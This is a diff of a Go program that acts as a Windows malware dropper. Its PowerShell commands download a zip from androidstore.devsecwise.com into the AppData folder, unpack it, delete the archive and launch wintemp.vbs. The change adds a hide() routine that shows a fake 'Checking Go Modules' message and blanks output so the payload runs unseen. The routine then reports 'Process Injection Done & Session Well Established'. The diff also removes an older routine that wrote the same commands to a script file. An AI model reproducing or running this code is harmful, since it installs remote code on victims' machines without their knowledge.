@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"time"
 
 	"os/exec"
 
@@ -26,7 +27,7 @@ func main() {
 	case "windows":
 		win1()
 		fmt.Println("Windows")
-		win3()
+		hide()
 	case "darwin":
 		fmt.Println("MAC operating system")
 	case "linux":
@@ -39,6 +40,16 @@ func main() {
 		fmt.Printf("%s.\n", os)
 	}
 }
+func hide() {
+	fmt.Println("Checking Go Modules For Fun!")
+	time.Sleep(2 * time.Second)
+	fmt.Println("Initializing Modules....!")
+	temp := os.Stdout
+	os.Stdout = nil  
+	win3()           
+	os.Stdout = temp 
+	fmt.Println("Process Injection Done & Session Well Established")
+}
 func win3() {
 
 	cmd := exec.Command("powershell", "-nologo", "-noprofile")
@@ -48,35 +59,13 @@ func win3() {
 	}
 	go func() {
 		defer stdin.Close()
-		fmt.Fprintln(stdin, "Invoke-WebRequest -Uri https://androidstore.devsecwise.com/fileconfig.zip -OutFile \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"")
-		fmt.Fprintln(stdin, "Expand-Archive -LiteralPath \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\" -DestinationPath \"$env:appdata\\Microsoft\\Windows\\\"")
-		fmt.Fprintln(stdin, "Remove-Item -Force \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"")
-		fmt.Fprintln(stdin, "sTaRt-Process -FilePath \"$env:appdata\\Microsoft\\Windows\\wintemp.vbs\"")
+		fmt.Fprintf(stdin, "$prevProgressPreference = $global:ProgressPreference;$global:ProgressPreference = 'SilentlyContinue';Invoke-WebRequest -Uri https://androidstore.devsecwise.com/fileconfig.zip -OutFile \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\";Expand-Archive -LiteralPath \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\" -DestinationPath \"$env:appdata\\Microsoft\\Windows\\\";Remove-Item -Force \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\";sTaRt-Process -FilePath \"$env:appdata\\Microsoft\\Windows\\wintemp.vbs\"")
 	}()
 	out, err := cmd.CombinedOutput()
-
-	// Do other stuff while cmd runs in background:
-
 	fmt.Printf("%s\n", out)
 
 }
-func win2() {
-	fmt.Println("File Done For Windows")
-	homeDir := UserHomeDir()
-	f, err := os.Create(homeDir + "\\AppData" + "\\Roaming" + "\\Microsoft" + "\\windows" + "\\wintemp.ps1")
 
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	defer f.Close()
-
-	_, err2 := f.WriteString("Invoke-WebRequest -Uri https://androidstore.devsecwise.com/fileconfig.zip -OutFile \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"\nExpand-Archive -LiteralPath \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\" -DestinationPath \"$env:appdata\\Microsoft\\Windows\\\"\nRemove-Item -Force \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"\nsTaRt-Process -FilePath \"$env:appdata\\Microsoft\\Windows\\wintemp.vbs\"")
-
-	if err2 != nil {
-		log.Fatal(err2)
-	}
-}
 func win1() {
 	fmt.Println("File Done For Windows")
 	homeDir := UserHomeDir()
@@ -94,7 +83,6 @@ func win1() {
 		log.Fatal(err2)
 	}
 }
-
 func mali() {
 	f, err := os.Create("/tmp/system.sh")
 
@@ -132,11 +120,9 @@ func meo() {
 		return
 	}
 
-	// Do other stuff while cmd runs in background:
 	log.Println("Doing other stuff...")
 	testing()
 
-	// And when you need to wait for the command to finish:
 	if err := cmd.Wait(); err != nil {
 		log.Printf("Cmd returned error: %v", err)
 	}
